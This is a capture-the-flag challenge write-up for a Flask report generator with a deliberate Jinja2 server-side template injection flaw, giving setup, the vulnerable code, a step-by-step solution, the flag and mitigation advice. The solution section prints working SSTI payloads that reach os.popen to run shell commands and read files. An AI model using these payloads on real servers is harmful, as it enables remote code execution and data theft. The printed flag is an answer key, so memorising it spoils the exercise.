# Challenge 2 — "The Report Engine"
**Category:** Web
**Vulnerability:** Server-Side Template Injection (SSTI) — Jinja2
**Difficulty:** Medium
**Flag:** `cusectf{j1nj4_t3mpl4t3s_4r3_n0t_a_sandbox}`

---

## Scenario

> ReportEngine v1.0 is a slick internal tool that generates personalized status reports. The developer was proud of how "dynamic" the system was — inserting user input directly into templates. Maybe a little too dynamic...

---

## Setup

```bash
pip install flask
python app.py
# Visit http://localhost:5001
```

---

## Vulnerability

In `/report`, the user-supplied `name` parameter is **string-concatenated** into a Jinja2 template before `render_template_string()` processes it:

```python
template = REPORT_TEMPLATE.replace("{{ name }}", name)
return render_template_string(template)   # <-- renders attacker-controlled template
```

This means any Jinja2 syntax in `name` is **executed server-side**.

---

## Solution (spoilers below — for challenge authors only)

### Step 1 — Confirm SSTI

Visit:
```
http://localhost:5001/report?name={{7*7}}
```
If the page renders `49` in the Recipient field, the app is vulnerable to SSTI.

### Step 2 — Enumerate Jinja2 internals

Jinja2 templates can traverse Python's object hierarchy through `__class__`, `__mro__`, and `__subclasses__`:

```
http://localhost:5001/report?name={{''.__class__.__mro__}}
```

### Step 3 — Read the flag file

Use Jinja2's `lipsum` global (which exposes `__globals__`) to reach `os` and read `/tmp/flag.txt`:

**Payload:**
```
{{lipsum.__globals__['os'].popen('cat /tmp/flag.txt').read()}}
```

Full URL (URL-encode brackets for safety in some shells):
```
http://localhost:5001/report?name={{lipsum.__globals__['os'].popen('cat%20/tmp/flag.txt').read()}}
```

**Alternative payload using subclass traversal:**
```
{{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['__builtins__']['open']('/tmp/flag.txt').read()}}
```
*(Subclass index may vary by Python version — players need to find the right index for `_io.FileIO` or `subprocess.Popen`.)*

### Step 4 — Collect the flag

```
cusectf{j1nj4_t3mpl4t3s_4r3_n0t_a_sandbox}
```

---

## Learning Objectives

- Identifying SSTI through expression evaluation (`{{7*7}}`)
- Traversing Python's object model to reach dangerous builtins
- Difference between **client-side** template injection (XSS) and **server-side** (code execution)
- Mitigation: never pass user input into `render_template_string()`; use `render_template()` with a static template file and pass data as context variables only

---

## Useful SSTI References

- PayloadsAllTheThings SSTI cheatsheet
- HackTricks Jinja2 SSTI
- PortSwigger Web Security Academy — SSTI
